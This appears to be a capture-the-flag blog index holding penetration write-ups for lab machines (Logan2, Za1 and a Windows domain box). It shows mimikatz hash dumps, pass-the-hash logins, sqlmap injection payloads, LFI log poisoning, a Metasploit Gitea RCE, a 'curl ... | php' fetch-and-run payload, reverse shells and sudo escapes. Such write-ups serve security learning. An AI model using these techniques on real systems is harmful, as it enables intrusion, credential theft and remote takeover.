WIN-M6B2MLRMAV2Administrator Default Iterations : 4096 Credentials aes256_hmac (4096) : 607d0d2a033f168a27f0c264bd78ddcbe6270668a9548268f5f10215c2d3579e aes128_hmac (4096) : 4cf85bcc3bd2ca2e3c5a3b8f6a65a661 des_cbc_md5 (4096) : 70373d546be92a80* Packages * NTLM-Strong-NTOWF* Primary:Kerberos * Default Salt : WIN-M6B2MLRMAV2Administrator Credentials des_cbc_md5 : 70373d546be92a80mimikatz(commandline) # exitBye!*Evil-WinRM* PS C:\\Users\\cyberdemon\\Documents>```{: .nolineno}Now lets try Evil-Winrm for Administrator with hash value â†’```powershellâ”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/PwnTillDawn/10.150.150.66]â””â”€$ evil-winrm -i 10.150.150.66 -u 'Administrator' -H '9e4e2dac5807fb745533e0dda18bfbf6' Evil-WinRM shell v3.5 Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion Info: Establishing connection to remote endpoint*Evil-WinRM* PS C:\\Users\\Administrator\\Documents> whoami /allUSER INFORMATION----------------User Name SID===================== ====================================doomops\\administrator S-1-5-21-1663250433-20091270-1145847307-500GROUP INFORMATION-----------------Group Name Type SID Attributes============================================== ================ =========================================== ========================================================Everyone Well-known group S-1-1-0 Mandatory group, Enabled by default, Enabled groupBUILTIN\\Administrators Alias S-1-5-32-544 Mandatory group, Enabled by default, Enabled group, Group ownerBUILTIN\\Users Alias S-1-5-32-545 Mandatory group, Enabled by default, Enabled groupBUILTIN\\Pre-Windows 2000 Compatible Access Alias S-1-5-32-554 Mandatory group, Enabled by default, Enabled groupNT AUTHORITY\\NETWORK Well-known group S-1-5-2 Mandatory group, Enabled by default, Enabled groupNT AUTHORITY\\Authenticated Users Well-known group S-1-5-11 Mandatory group, Enabled by default, Enabled groupNT AUTHORITY\\This Organization Well-known group S-1-5-15 Mandatory group, Enabled by default, Enabled groupDOOMOPS\\Domain Admins Group S-1-5-21-1663250433-20091270-1145847307-512 Mandatory group, Enabled by default, Enabled groupDOOMOPS\\Group Policy Creator Owners Group S-1-5-21-1663250433-20091270-1145847307-520 Mandatory group, Enabled by default, Enabled groupDOOMOPS\\Enterprise Admins Group S-1-5-21-1663250433-20091270-1145847307-519 Mandatory group, Enabled by default, Enabled groupDOOMOPS\\Schema Admins Group S-1-5-21-1663250433-20091270-1145847307-518 Mandatory group, Enabled by default, Enabled groupDOOMOPS\\Denied RODC Password Replication Group Alias S-1-5-21-1663250433-20091270-1145847307-572 Mandatory group, Enabled by default, Enabled group, Local GroupNT AUTHORITY\\NTLM Authentication Well-known group S-1-5-64-10 Mandatory group, Enabled by default, Enabled groupMandatory Label\\High Mandatory Level Label S-1-16-12288PRIVILEGES INFORMATION----------------------Privilege Name Description State========================================= ================================================================== SeIncreaseQuotaPrivilege Adjust memory quotas for a process EnabledSeMachineAccountPrivilege Add workstations to domain EnabledSeSecurityPrivilege Manage auditing and security log EnabledSeTakeOwnershipPrivilege Take ownership of files or other objects EnabledSeLoadDriverPrivilege Load and unload device drivers EnabledSeSystemProfilePrivilege Profile system performance EnabledSeSystemtimePrivilege Change the system time EnabledSeProfileSingleProcessPrivilege Profile single process EnabledSeIncreaseBasePriorityPrivilege Increase scheduling priority EnabledSeCreatePagefilePrivilege Create a pagefile EnabledSeBackupPrivilege Back up files and directories EnabledSeRestorePrivilege Restore files and directories EnabledSeShutdownPrivilege Shut down the system EnabledSeDebugPrivilege Debug programs EnabledSeSystemEnvironmentPrivilege Modify firmware environment values EnabledSeChangeNotifyPrivilege Bypass traverse checking EnabledSeRemoteShutdownPrivilege Force shutdown from a remote system EnabledSeUndockPrivilege Remove computer from docking station EnabledSeEnableDelegationPrivilege Enable computer and user accounts to be trusted for delegation EnabledSeManageVolumePrivilege Perform volume maintenance tasks EnabledSeImpersonatePrivilege Impersonate a client after authentication EnabledSeCreateGlobalPrivilege Create global objects EnabledSeIncreaseWorkingSetPrivilege Increase a process working set EnabledSeTimeZonePrivilege Change the time zone EnabledSeCreateSymbolicLinkPrivilege Create symbolic links EnabledSeDelegateSessionUserImpersonatePrivilege Obtain an impersonation token for another user in the same session EnabledUSER CLAIMS INFORMATION-----------------------User claims unknown.Kerberos support for Dynamic Access Control on this device has been disabled.*Evil-WinRM* PS C:\\Users\\Administrator\\Documents> whoamidoomops\\administrator*Evil-WinRM* PS C:\\Users\\Administrator\\Documents>```{: .nolineno}Now I am Administrator or can say Admin too ðŸ¤« !!> If you have any questions or suggestions, please leave a comment below.Thank You ! {: .prompt-tip }" }, { "title": "Logan2", "url": "/posts/Logan2/", "categories": "HackMyVM", "tags": "LFI, Metasploit, SQLi, SUIDs, Werkzeug, gitea, php, PrivEsc", "date": "2023-10-12 00:00:00 +0530", "snippet": "## Description â¤µï¸This machine is *Logan2* , It is from HackMyVM Platform and categorized as Medium machine . This machine have a vulnerability of Local File Inclusion (LFI) and gitea that leads to ...", "content": "## Description â¤µï¸This machine is *Logan2* , It is from HackMyVM Platform and categorized as Medium machine . This machine have a vulnerability of Local File Inclusion (LFI) and gitea that leads to the RCE to root.## Port Scan Results â¤µï¸![Untitled](Logan2/Untitled%201.png)```bashâ”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/HackMyVM/Logan2]â””â”€$ sudo nmap -sC -sV -p- -T4 -oN Nmap_results.txt 10.0.2.69Starting Nmap 7.94 ( https://nmap.org ) at 2023-10-07 21:43 ISTNmap scan report for 10.0.2.69Host is up (0.00095s latency).Not shown: 65532 closed tcp ports (reset)PORT STATE SERVICE VERSION22/tcp open ssh OpenSSH 9.2p1 Debian 2 (protocol 2.0)| ssh-hostkey: | 256 10:ed:dd:ab:26:fd:f4:9f:28:1e:89:93:f4:58:16:ab (ECDSA)|_ 256 43:3b:d9:8c:12:44:e9:92:be:cf:1a:78:fd:33:38:67 (ED25519)80/tcp open http Apache httpd 2.4.57 ((Debian))|_http-title: Logan|_http-server-header: Apache/2.4.57 (Debian)3000/tcp open ppp?| fingerprint-strings: | GenericLines, Help: | HTTP/1.1 400 Bad Request| Content-Type: text/plain; charset=utf-8| Connection: close| Request| GetRequest: | HTTP/1.0 200 OK| Content-Type: text/html; charset=UTF-8| Set-Cookie: lang=en-US; Path=/; Max-Age=2147483647| Set-Cookie: i_like_gitea=b22ffb3662b3ed8f; Path=/; HttpOnly| Set-Cookie: _csrf=wLgLgpHZLC7yUIF-NW1wYgh-z_o6MTY5NjY5NTIyNzM1OTY1MjExMw; Path=/; Expires=Sun, 08 Oct 2023 16:13:47 GMT; HttpOnly| X-Frame-Options: SAMEORIGIN| Date: Sat, 07 Oct 2023 16:13:47 GMT| | | | | | | Gitea: Git with a cup of tea | | | | | | | | | | Page Not Found - Gitea: Git with a cup of tea | | | |_ = 5.0.12 AND time-based blind (query SLEEP) Payload: { \"user_agent\": \"1' AND (SELECT 9966 FROM (SELECT(SLEEP(5)))OcQg) AND 'eoXp'='eoXp\" }---[13:45:34] [INFO] the back-end DBMS is MySQLweb server operating system: Linux Debianweb application technology: Apache 2.4.57back-end DBMS: MySQL >= 5.0.12 (MariaDB fork)[13:45:34] [INFO] sqlmap will dump entries of all tables from all databases now[13:45:34] [INFO] fetching database names[13:45:34] [INFO] fetching number of databases[13:45:34] [INFO] resumed: 2[13:45:34] [INFO] resumed: information_schema[13:45:34] [INFO] resumed: logan[13:45:34] [INFO] fetching tables for databases: 'information_schema, logan'[13:45:34] [INFO] fetching number of tables for database 'logan'[13:45:34] [INFO] resumed: 3[13:45:34] [INFO] resumed: browser[13:45:34] [INFO] resumed: comments[13:45:34] [INFO] resumed: users[13:45:34] [INFO] fetching number of tables for database 'information_schema'[13:45:34] [INFO] resumed: 79[13:45:34] [INFO] resumed: ALL_PLUGINS[13:45:34] [INFO] resumed: APPLICABLE_ROLES[13:45:34] [INFO] resumed: CHARACTER_SETS[13:45:34] [INFO] resumed: CHECK_CONSTRAINTS[13:45:34] [INFO] resumed: COLLATIONS[13:45:34] [INFO] resumed: COLLATION_CHARACTER_SET_APPLICABILITY[13:45:34] [INFO] resumed: COLUMNS[13:45:34] [INFO] resumed: COLUMN_PRIVILEGES[13:45:34] [INFO] resumed: ENABLED_ROLES[13:45:34] [INFO] resumed: ENGINES[13:45:34] [INFO] resumed: EVENTS[13:45:34] [INFO] resumed: FILES[13:45:34] [INFO] resumed: GLOBAL_STATUS...```{: .nolineno}I saperately ran the command to extract data it was taking so much time â†’```bashâ”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/HackMyVM/Logan2]â””â”€$ sqlmap -r sqli.txt --dump -D logan -T users ___ __H__ ___ ___[.]_____ ___ ___ {1.7.9#stable}|_ -| . [\"] | .'| . ||___|_ [,]_|_|_|__,| _| |_|V... |_| \"https://sqlmap.org[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end users responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program[*] starting @ 13:55:38 /2023-10-12/[13:55:38] [INFO] parsing HTTP request from 'sqli.txt'custom injection marker ('*') found in POST body. Do you want to process it? [Y/n/q] YY[13:55:47] [INFO] resuming back-end DBMS 'mysql' [13:55:47] [INFO] testing connection to the target URLsqlmap resumed the following injection point(s) from stored session:---Parameter: JSON #1* ((custom) POST) Type: time-based blind Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP) Payload: { \"user_agent\": \"1' AND (SELECT 9966 FROM (SELECT(SLEEP(5)))OcQg) AND 'eoXp'='eoXp\" }---[13:55:47] [INFO] the back-end DBMS is MySQLweb server operating system: Linux Debianweb application technology: Apache 2.4.57back-end DBMS: MySQL >= 5.0.12 (MariaDB fork)[13:55:47] [INFO] fetching columns for table 'users' in database 'logan'[13:55:47] [WARNING] time-based comparison requires larger statistical model, please wait.............................. (done)[13:55:48] [WARNING] it is very important to not stress the network connection during usage of time-based payloads to prevent potential disruptions do you want sqlmap to try to optimize value(s) for DBMS delay responses (option '--time-sec')? [Y/n] Y2[13:56:05] [INFO] retrieved: [13:56:10] [INFO] adjusting time delay to 1 second due to good response timesuser[13:56:22] [INFO] retrieved: email[13:56:36] [INFO] fetching entries for table 'users' in database 'logan'[13:56:36] [INFO] fetching number of entries for table 'users' in database 'logan'[13:56:36] [INFO] retrieved: 1[13:56:37] [WARNING] (case) time-based comparison requires reset of statistical model, please wait.............................. (done)logan[13:56:56] [INFO] retrieved: logan@newsitelogan.logan.hmvDatabase: loganTable: users[1 entry]+------------------------------+--------+| email | user |+------------------------------+--------+| logan@newsitelogan.logan.hmv | logan |+------------------------------+--------+[13:58:42] [INFO] table 'logan.users' dumped to CSV file '/home/kali/.local/share/sqlmap/output/10.0.2.69/dump/logan/users.csv'[13:58:42] [INFO] fetched data logged to text files under '/home/kali/.local/share/sqlmap/output/10.0.2.69'```{: .nolineno}I got this email from this users table and that gives me a domain name , Lets set the domain as `newsitelogan.logan.hmv` in hosts file â†’![Untitled](Logan2/Untitled%205.png)I checked its source code and it indicated this path â†’![Untitled](Logan2/Untitled%206.png)I can able to get the LFI from directory traversal and got `/etc/passwd` file â†’```bashhttp://newsitelogan.logan.hmv/photos-website-logan.php?photo=../../../../../etc/passwd```{: .nolineno}![Untitled](Logan2/Untitled%207.png)While accessing apache2 logs I get this message â†’![Untitled](Logan2/Untitled%208.png)If the Logs are cleared every minutes , then there is no option for system command execution because it will get deleted every minute so , lets try to see the phpinfo() part â†’I used this User-Agent value to get the `phpinfo()` page : ```bashGET /photos-website-logan.php?photo=../../../../../var/log/apache2/access.log HTTP/1.1Host: newsitelogan.logan.hmvUser-Agent: Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8Accept-Language: en-US,en;q=0.5Accept-Encoding: gzip, deflate, brConnection: closeUpgrade-Insecure-Requests: 1```{: .nolineno}![Untitled](Logan2/Untitled%209.png)> Now I see the disable_fuction that can not be used while pentesting so lets use different functions like `include()` , `file_get_contents()` like these functions and many others â†’>>Lets include a parameter `cmd` that will work similar to the parameter of `photo` â†’{: .prompt-info }```bashUser-Agent: ```{: .nolineno}![Untitled](Logan2/Untitled%2010.png)Now lets work with `cmd` as we worked with `photo` parameter â†’```bash#RequestGET /photos-website-logan.php?photo=../../../../../var/log/apache2/access.log&cmd=../../../../../etc/passwd HTTP/1.1Host: newsitelogan.logan.hmvUser-Agent: Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8Accept-Language: en-US,en;q=0.5Accept-Encoding: gzip, deflate, brConnection: closeUpgrade-Insecure-Requests: 1```{: .nolineno}![Untitled](Logan2/Untitled%2011.png)I can now perform php Wrapper over this parameter `cmd` â†’![Untitled](Logan2/Untitled%2012.png)Lets access the `config.php` file in this way â†’![Untitled](Logan2/Untitled%2013.png)I got this credentials â†’```bash$username = \"logan\";$password = \"Super_logan1234\";```{: .nolineno}Now I looked into port 3000 that runs gitea services so lets use this credentails to access that gitea page â†’![Untitled](Logan2/Untitled%2014.png)Login with this â†’![Untitled](Logan2/Untitled%2015.png)I got this access lets see what gitea can offer me â†’ I also got the `gitea version 1.12.5` and got the version exploit for that also â†’[https://www.exploit-db.com/exploits/49571](https://www.exploit-db.com/exploits/49571)![Untitled](Logan2/Untitled%2016.png)I used this exploit and got the shell from metasploit usage like this â†’```bashâ”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/HackMyVM/Logan2]â””â”€$ msfconsole -q msf6 > search gitea 1.12Matching Modules========= # Name Disclosure Date Rank Check Description - ---- --------------- ---- ----- ----------- 0 exploit/multi/http/gitea_git_hooks_rce 2020-10-07 excellent Yes Gitea Git Hooks Remote Code ExecutionInteract with a module by name or index. For example info 0, use 0 or use exploit/multi/http/gitea_git_hooks_rcemsf6 > use 0[*] Using configured payload linux/x64/meterpreter/reverse_tcpmsf6 exploit(multi/http/gitea_git_hooks_rce) > optionsModule options (exploit/multi/http/gitea_git_hooks_rce): Name Current Setting Required Description ---- --------------- -------- ----------- PASSWORD yes Password to use Proxies no A proxy chain of format type:host:port[,type:host:port][...] RHOSTS yes The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/usin g-metasploit.html RPORT 3000 yes The target port (TCP) SSL false no Negotiate SSL/TLS for outgoing connections SSLCert no Path to a custom SSL certificate (default is randomly generated) TARGETURI / yes Base path URIPATH no The URI to use for this exploit (default is random) USERNAME yes Username to authenticate with VHOST no HTTP server virtual host When CMDSTAGER::FLAVOR is one of auto,tftp,wget,curl,fetch,lwprequest,psh_invokewebrequest,ftp_http: Name Current Setting Required Description ---- --------------- -------- ----------- SRVHOST 0.0.0.0 yes The local host or network interface to listen on. This must be an address on the local machine or 0.0.0.0 to listen on all addresses. SRVPORT 8080 yes The local port to listen on.Payload options (linux/x64/meterpreter/reverse_tcp): Name Current Setting Required Description ---- --------------- -------- ----------- LHOST yes The listen address (an interface may be specified) LPORT 4444 yes The listen portExploit target: Id Name -- ---- 1 Linux DropperView the full module info with the info, or info -d command.msf6 exploit(multi/http/gitea_git_hooks_rce) > set RHOSTS 10.0.2.69RHOSTS => 10.0.2.69msf6 exploit(multi/http/gitea_git_hooks_rce) > set LHOST 10.0.2.60LHOST => 10.0.2.60msf6 exploit(multi/http/gitea_git_hooks_rce) > set username loganusername => loganmsf6 exploit(multi/http/gitea_git_hooks_rce) > set password Super_logan1234password => Super_logan1234msf6 exploit(multi/http/gitea_git_hooks_rce) > run[*] Started reverse TCP handler on 10.0.2.60:4444 [*] Running automatic check (\"set AutoCheck false\" to disable)[+] The target appears to be vulnerable. Gitea version is 1.12.5[*] Executing Linux Dropper for linux/x64/meterpreter/reverse_tcp[*] Authenticate with \"logan/Super_logan1234\"[+] Logged in[*] Create repository \"Prodder_Bigtax\"[+] Repository created[*] Setup post-receive hook with command[+] Git hook setup[*] Create a dummy file on the repo to trigger the payload[+] File created, shell incoming...[*] Command Stager progress - 100.00% done (833/833 bytes)[*] Sending stage (3045380 bytes) to 10.0.2.69[*] Meterpreter session 1 opened (10.0.2.60:4444 -> 10.0.2.69:44282) at 2023-10-13 21:40:11 +0530[*] Cleaning up[*] Repository Prodder_Bigtax deleted.meterpreter > shellProcess 8895 created.Channel 1 created.sh: 0: getcwd() failed: No such file or directorypython3 -c 'import pty;pty.spawn(\"/bin/bash\")'shell-init: error retrieving current directory: getcwd: cannot access parent directories: No such file or directorygit@logan2:$ git@logan2:$ /bin/bash -i/bin/bash -ishell-init: error retrieving current directory: getcwd: cannot access parent directories: No such file or directorygit@logan2:$ ls -alls -altotal 0git@logan2:$ ididuid=104(git) gid=113(git) groups=113(git)git@logan2:$ cd /cd /chdir: error retrieving current directory: getcwd: cannot access parent directories: No such file or directorygit@logan2:/$ ls -alls -altotal 68drwxr-xr-x 18 root root 4096 Aug 27 14:34 .drwxr-xr-x 18 root root 4096 Aug 27 14:34 ..lrwxrwxrwx 1 root root 7 Aug 27 14:31 bin -> usr/bindrwxr-xr-x 3 root root 4096 Aug 27 14:35 bootdrwxr-xr-x 17 root root 3300 Oct 12 23:44 devdrwxr-xr-x 79 root root 4096 Oct 13 11:08 etcdrwxr-xr-x 5 root root 4096 Sep 11 06:29 homelrwxrwxrwx 1 root root 30 Aug 27 14:34 initrd.img -> boot/initrd.img-6.1.0-11-amd64lrwxrwxrwx 1 root root 30 Aug 27 14:32 initrd.img.old -> boot/initrd.img-6.1.0-10-amd64lrwxrwxrwx 1 root root 7 Aug 27 14:31 lib -> usr/liblrwxrwxrwx 1 root root 9 Aug 27 14:31 lib32 -> usr/lib32lrwxrwxrwx 1 root root 9 Aug 27 14:31 lib64 -> usr/lib64lrwxrwxrwx 1 root root 10 Aug 27 14:31 libx32 -> usr/libx32drwx------ 2 root root 16384 Aug 27 14:31 lost+founddrwxr-xr-x 3 root root 4096 Aug 27 14:31 mediadrwxr-xr-x 2 root root 4096 Aug 27 14:31 mntdrwx------ 4 root root 4096 Sep 13 05:36 optdr-xr-xr-x 151 root root 0 Oct 12 23:44 procdrwx------ 5 root root 4096 Sep 14 03:33 rootdrwxr-xr-x 20 root root 560 Oct 12 23:44 runlrwxrwxrwx 1 root root 8 Aug 27 14:31 sbin -> usr/sbindrwxr-xr-x 2 root root 4096 Aug 27 14:31 srvdr-xr-xr-x 13 root root 0 Oct 12 23:44 sysdrwxrwxrwt 8 root root 4096 Oct 13 11:10 tmpdrwxr-xr-x 14 root root 4096 Aug 27 14:31 usrdrwxr-xr-x 12 root root 4096 Aug 27 14:45 varlrwxrwxrwx 1 root root 27 Aug 27 14:34 vmlinuz -> boot/vmlinuz-6.1.0-11-amd64lrwxrwxrwx 1 root root 27 Aug 27 14:32 vmlinuz.old -> boot/vmlinuz-6.1.0-10-amd64git@logan2:/$ whoamiwhoamigitgit@logan2:/$ uname -anuname -anLinux logan2 6.1.0-11-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.1.38-4 (2023-08-08) x86_64 GNU/Linuxgit@logan2:/$ sudo -Vsudo -VSudo version 1.9.13p3Sudoers policy plugin version 1.9.13p3Sudoers file grammar version 50Sudoers I/O plugin version 1.9.13p3Sudoers audit plugin version 1.9.13p3git@logan2:/$ ss -tunlpss -tunlpNetid State Recv-Q Send-Q Local Address:Port Peer Address:PortProcessudp UNCONN 0 0 0.0.0.0:68 0.0.0.0:* tcp LISTEN 0 80 127.0.0.1:3306 0.0.0.0:* tcp LISTEN 0 128 0.0.0.0:22 0.0.0.0:* tcp LISTEN 0 511 *:80 *:* tcp LISTEN 0 128 [::]:22 [::]:* tcp LISTEN 0 4096 *:3000 *:* users:((\"gitea\",pid=494,fd=36))git@logan2:/tmp$ sudo -lsudo -lMatching Defaults entries for git on logan2: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin, use_ptyUser git may run the following commands on logan2: (ALL) NOPASSWD: /usr/bin/python3 /opt/app.pygit@logan2:/tmp$ sudo /usr/bin/python3 /opt/app.pysudo /usr/bin/python3 /opt/app.py * Serving Flask app 'app' * Debug mode: onWARNING: This is a development server. Do not use it in a production deployment. Use a production WSGI server instead. * Running on all addresses (0.0.0.0) * Running on http://127.0.0.1:8000 * Running on http://10.0.2.69:8000Press CTRL+C to quit * Restarting with stat * Debugger is active! * Debugger PIN: 991-528-255```{: .nolineno}Now Lets access this flask page through browser from this url â†’ `http://10.0.2.69:8000` â†’![Untitled](Logan2/Untitled%2017.png)since it is running on flask then it also contains console directory for python command execution for Werkzeug.![Untitled](Logan2/Untitled%2018.png)```bash__import__('os').popen('curl 10.0.2.60/shell.php|php').read();```{: .nolineno}In response to that I got this â†’![Untitled](Logan2/Untitled%2019.png)I am root now â†’```bash# ls -altotal 48drwx------ 5 root root 4096 Sep 14 03:33 .drwxr-xr-x 18 root root 4096 Aug 27 14:34 ..lrwxrwxrwx 1 root root 9 Sep 11 06:33 .bash_history -> /dev/null-rw-r--r-- 1 root root 571 Apr 10 2021 .bashrcdrwxr-xr-x 3 root root 4096 Sep 13 05:34 .cache-rw------- 1 root root 20 Sep 11 07:17 .lesshstdrwxr-xr-x 3 root root 4096 Aug 27 14:49 .local-rw------- 1 root root 819 Sep 14 03:33 .mysql_history-rw-r--r-- 1 root root 161 Jul 9 2019 .profile-rw-r--r-- 1 root root 66 Sep 11 07:20 .selected_editordrwx------ 2 root root 4096 Aug 27 14:32 .ssh-rw-r--r-- 1 root root 186 Aug 27 16:44 .wget-hsts-rw-r--r-- 1 root root 29 Sep 12 15:09 root.txt# cat root.txtRoot flag: FLAGFLAGFLAGFLAG# ls -al /hometotal 20drwxr-xr-x 5 root root 4096 Sep 11 06:29 .drwxr-xr-x 18 root root 4096 Aug 27 14:34 ..drwxr-xr-x 4 git git 4096 Oct 13 21:20 gitdrwx------ 2 kevin kevin 4096 Sep 11 06:34 kevindrwx------ 3 logan logan 4096 Sep 11 06:32 logan# cd /home/kevin# ls -altotal 20drwx------ 2 kevin kevin 4096 Sep 11 06:34 .drwxr-xr-x 5 root root 4096 Sep 11 06:29 ..lrwxrwxrwx 1 root root 9 Sep 11 06:34 .bash_history -> /dev/null-rw-r--r-- 1 kevin kevin 220 Sep 11 06:29 .bash_logout-rw-r--r-- 1 kevin kevin 3526 Sep 11 06:29 .bashrc-rw-r--r-- 1 kevin kevin 807 Sep 11 06:29 .profile# cd ../logan# ls -altotal 28drwx------ 3 logan logan 4096 Sep 11 06:32 .drwxr-xr-x 5 root root 4096 Sep 11 06:29 ..lrwxrwxrwx 1 root root 9 Sep 11 06:32 .bash_history -> /dev/null-rw-r--r-- 1 logan logan 220 Aug 27 14:35 .bash_logout-rw-r--r-- 1 logan logan 3526 Aug 27 14:35 .bashrcdrwxr-xr-x 3 logan logan 4096 Sep 11 06:30 .local-rw-r--r-- 1 logan logan 807 Aug 27 14:35 .profile-rw-r--r-- 1 logan logan 32 Sep 11 06:31 user.txt# cat user.txtUser Flag: FLAGFLAGFLAGFLAG#```{: .nolineno}> If you have any questions or suggestions, please leave a comment below.Thank You ! {: .prompt-tip }" }, { "title": "Za1", "url": "/posts/Za1/", "categories": "HackMyVM", "tags": "CMS, PrivEsc, Typecho", "date": "2023-10-10 00:00:00 +0530", "snippet": "## Description â¤µï¸This machine name is [Za1](https://hackmyvm.eu/machines/machine.php?vm=Za1). It is from HackMyVM Platform .it is categorised as Easy machine and basically it is Chinese Language so...", "content": "## Description â¤µï¸This machine name is [Za1](https://hackmyvm.eu/machines/machine.php?vm=Za1). It is from HackMyVM Platform .it is categorised as Easy machine and basically it is Chinese Language so for decoding that into english I used an extension called **TWP - Translate.** I set it for this whole site so that whenever I click on any link of this site if new page opens up it get translated automatically.## Port Scan Results â¤µï¸![Untitled](Za1/Untitled%201.png)```bashâ”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/HackMyVM/Za1]â””â”€$ sudo nmap -sC -sV -p- -T4 -oN Nmap_results.txt 10.0.2.70Starting Nmap 7.94 ( https://nmap.org ) at 2023-10-08 10:40 ISTNmap scan report for 10.0.2.70Host is up (0.0018s latency).Not shown: 65533 closed tcp ports (reset)PORT STATE SERVICE VERSION22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)| ssh-hostkey: | 2048 36:32:5b:78:d0:f4:3c:9f:05:1a:a7:13:91:3e:38:c1 (RSA)| 256 72:07:82:15:26:ce:13:34:e8:42:cf:da:de:e2:a7:14 (ECDSA)|_ 256 fc:9c:66:46:86:60:1a:29:32:c6:1f:ec:b2:47:b8:74 (ED25519)80/tcp open http?MAC Address: 08:00:27:CE:93:2B (Oracle VirtualBox virtual NIC)Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel```{: .nolineno}## Web Enumeration â¤µï¸I loaded the port 80 site and I set the hosts name as `za1.hmv` as I got to know from the site only â†’![Untitled](Za1/Untitled%202.png)Now through directory or files bruteforcing I got a database of sqlite through Tool feroxbuster â†’```bash301 GET 9l 28w 306c http://10.0.2.70/admin => http://10.0.2.70/admin/301 GET 9l 28w 308c http://10.0.2.70/install => http://10.0.2.70/install/MSG 0.000 feroxbuster::heuristics detected directory listing: http://10.0.2.70/install (Apache)200 GET 130l 478w 3886c http://10.0.2.70/install/Pgsql.sql200 GET 0l 0w 0c http://10.0.2.70/install/SQLite.php200 GET 87l 404w 3147c http://10.0.2.70/install/SQLite.sql200 GET 152l 457w 4255c http://10.0.2.70/install/Mysql.sql200 GET 0l 0w 0c http://10.0.2.70/install/Pgsql.php200 GET 294l 714w 11398c http://10.0.2.70/index.php/start-page.html200 GET 131l 336w 6752c http://10.0.2.70/index.php302 GET 0l 0w 0c http://10.0.2.70/admin/ => http://10.0.2.70/admin/login.php?referer=http%3A%2F%2F10.0.2.70%2Fadmin%2F200 GET 187l 479w 7717c http://10.0.2.70/admin/login.php200 GET 17l 22w 386c http://10.0.2.70/index.php/action/xmlrpc200 GET 131l 336w 6752c http://10.0.2.70/200 GET 0l 0w 0c http://10.0.2.70/install/Mysql.php302 GET 0l 0w 0c http://10.0.2.70/install.php => http://10.0.2.70/301 GET 9l 28w 304c http://10.0.2.70/sql => http://10.0.2.70/sql/MSG 0.000 feroxbuster::heuristics detected directory listing: http://10.0.2.70/sql (Apache)200 GET 115l 591w 102732c http://10.0.2.70/sql/sercet.sql200 GET 118l 599w 102769c http://10.0.2.70/sql/new.sql200 GET 118l 599w 102769c http://10.0.2.70/usr/64c0dcaf26f51.db```{: .nolineno}I quickly downloaded that file and observed it with preinstalled application of sqlite on kali â†’![Untitled](Za1/Untitled%203.png)I got the password hashes so I tried to crack those passwords hashes through hashcat tool â†’![Untitled](Za1/Untitled%204.png)I got the password for admin user â†’```bashadmin : 123456```{: .nolineno}So I Logged in and observed this CMS â†’I enabled the file upload format through going into *set up > basic > File types allowed to be uploaded* â†’![Untitled](Za1/Untitled%205.png)Now I saved the settings and moved to *write > Create page > appendix (option) > choose file upload* â†’![Untitled](Za1/Untitled%206.png)Here I uploaded the php reverse shell file from attacker machine and publised it â†’Then I went to *manage > document > shell.php* â†’I got this url to load my reverse shell â†’![Untitled](Za1/Untitled%207.png)I loaded that url and I got the reverse shell â†’```bashâ”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/HackMyVM/Za1]â””â”€$ nc -lvnp 4444 listening on [any] 4444 ...\tconnect to [10.0.2.60] from (UNKNOWN) [10.0.2.70] 40758Linux za_1 4.15.0-213-generic #224-Ubuntu SMP Mon Jun 19 13:30:12 UTC 2023 x86_64 x86_64 x86_64 GNU/Linux 05:59:12 up 51 min, 0 users, load average: 0.00, 0.01, 1.96USER TTY FROM LOGIN@ IDLE JCPU PCPU WHATuid=33(www-data) gid=33(www-data) groups=33(www-data)/bin/sh: 0: cant access tty; job control turned off$ /bin/bash -ibash: cannot set terminal process group (1230): Inappropriate ioctl for devicebash: no job control in this shellwww-data@za_1:/$ www-data@za_1:/$ whoamiwhoamiwww-datawww-data@za_1:/$ ididuid=33(www-data) gid=33(www-data) groups=33(www-data)www-data@za_1:/$ pwd/pwdwww-data@za_1:/$```{: .nolineno}Let dig deeper â†’I simple executed sudo -l command and I got the output â†’```bashwww-data@za_1:/$ sudo -lMatching Defaults entries for www-data on za_1: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/binUser www-data may run the following commands on za_1: (za_1) NOPASSWD: /usr/bin/awkwww-data@za_1:/$ sudo -u za_1 awk 'BEGIN {system(\"/bin/sh\")}'$ whoamiza_1$ python3 -c 'import pty;pty.spawn(\"/bin/bash\")'za_1@za_1:/$ iduid=1000(za_1) gid=1000(za_1) groups=1000(za_1),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),108(lxd)za_1@za_1:/$za_1@za_1:/$ cd ~za_1@za_1:~$ ls -altotal 44drwxr-xr-x 6 za_1 za_1 4096 Aug 22 08:49 .drwxr-xr-x 3 root root 4096 Jul 26 07:07 ..lrwxrwxrwx 1 za_1 za_1 9 Aug 22 08:49 .bash_history -> /dev/null-rw-r--r-- 1 za_1 za_1 220 Apr 4 2018 .bash_logout-rw-r--r-- 1 za_1 za_1 3771 Apr 4 2018 .bashrcdrwx------ 2 za_1 za_1 4096 Jul 26 07:08 .cachedrwx------ 3 za_1 za_1 4096 Jul 26 07:08 .gnupg-rw-r--r-- 1 za_1 za_1 807 Apr 4 2018 .profiledrwxr-xr-x 2 za_1 za_1 4096 Jul 26 09:48 .rootdrwx------ 2 za_1 za_1 4096 Jul 26 07:07 .ssh-rw-r--r-- 1 za_1 za_1 0 Jul 26 07:17 